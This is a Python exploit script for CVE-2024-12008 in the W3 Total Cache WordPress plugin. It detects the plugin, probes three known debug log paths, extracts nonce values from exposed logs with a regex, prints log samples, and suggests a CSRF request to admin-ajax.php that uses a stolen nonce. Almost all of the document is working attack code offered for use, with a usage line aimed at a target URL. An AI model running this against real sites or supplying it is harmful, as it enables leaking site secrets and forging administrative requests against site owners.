Usage:
python3 w3tc_log_exploit.py -u https://vulnerable-site.com -v

----------------

import requests
import re
import argparse
from urllib.parse import urljoin

# Common debug log paths
DEBUG_PATHS = [
    "/wp-content/w3tc/debug.log",
    "/wp-content/plugins/w3-total-cache/w3tc/debug.log",
    "/wp-content/cache/w3tc/debug.log"
]

NONCE_REGEX = r"'nonce' => '([a-f0-9]{10,})'"

def detect_w3tc(target_url):
    """Check for W3 Total Cache presence"""
    try:
        response = requests.get(target_url, timeout=10)
        return "wp-content/plugins/w3-total-cache" in response.text
    except Exception as e:
        print(f"Detection error: {str(e)}")
        return False

def extract_nonces(log_content):
    """Extract potential nonce values from log"""
    return re.findall(NONCE_REGEX, log_content)

def exploit_debug_log(target_url, verbose=False):
    """Exploit CVE-2024-12008 by accessing debug logs"""
    found_logs = []
    
    for path in DEBUG_PATHS:
        full_url = urljoin(target_url, path)
        try:
            response = requests.get(
                full_url,
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=15
            )
            
            if response.status_code == 200:
                if verbose:
                    print(f"[+] Found debug log at {full_url}")
                
                content = response.text
                nonces = extract_nonces(content)
                
                if nonces:
                    return {
                        "vulnerable": True,
                        "log_url": full_url,
                        "nonces": list(set(nonces)),
                        "sample": content[:500] + "..." if len(content) > 500 else content
                    }
                else:
                    return {
                        "vulnerable": True,
                        "log_url": full_url,
                        "nonces": [],
                        "sample": content[:500] + "..." if len(content) > 500 else content
                    }
        
        except Exception as e:
            if verbose:
                print(f"Error checking {full_url}: {str(e)}")
    
    return {"vulnerable": False}

def main():
    parser = argparse.ArgumentParser(description="CVE-2024-12008 Exploit Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    args = parser.parse_args()
    
    if not args.url.startswith("http"):
        args.url = f"http://{args.url}"
    
    print(f"[*] Scanning {args.url}")
    
    if not detect_w3tc(args.url):
        print("[-] W3 Total Cache not detected")
        return
    
    print("[+] W3 Total Cache detected")
    result = exploit_debug_log(args.url, args.verbose)
    
    if result["vulnerable"]:
        print("\n[!] Vulnerable to CVE-2024-12008")
        print(f"Log File URL: {result['log_url']}")
        
        if result["nonces"]:
            print("\nExtracted Nonces:")
            for nonce in result["nonces"]:
                print(f"- {nonce}")
            
            print("\nPotential CSRF Attack Vectors:")
            print(f"POST {args.url}/wp-admin/admin-ajax.php")
            print(f"X-WP-Nonce: {result['nonces'][0]}")
        else:
            print("\nNo nonces found in log (might contain other sensitive data)")
        
        print(f"\nLog Sample:\n{result['sample']}")
    else:
        print("[+] No exposed debug logs found (debug mode might be disabled)")

if __name__ == "__main__":
    main()

---------
